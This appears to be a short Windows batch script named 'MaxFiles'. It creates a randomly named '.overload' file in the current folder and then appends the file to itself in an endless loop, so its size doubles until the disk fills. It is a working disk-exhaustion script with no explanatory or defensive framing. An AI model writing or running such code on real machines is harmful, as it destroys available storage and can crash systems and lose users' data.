@echo off
color a
title MaxFiles
ver >nul
cls

set /a file="%random%"
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>"%cd%\%file%.overload"
:loop
type "%cd%\%file%.overload">>"%cd%\%file%.overload"
goto loop